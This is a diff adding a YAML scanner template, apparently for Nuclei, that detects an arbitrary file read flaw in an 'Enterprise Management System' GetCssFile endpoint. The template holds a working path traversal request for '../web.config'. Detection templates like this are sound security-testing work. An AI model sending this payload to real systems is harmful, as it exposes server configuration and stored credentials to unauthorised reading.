@@ -1,0 +1,24 @@
+id: enterprise-management-system-getcssfile-anyfile-read
+info:
+  name: "Enterprise Management System GetCssFile 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Enterprise-Management-System
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Utility/GetCssFile?filePath=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "web.config"
+        part: body
+      - type: word
+        words:
+          - "text/css"
+        part: header
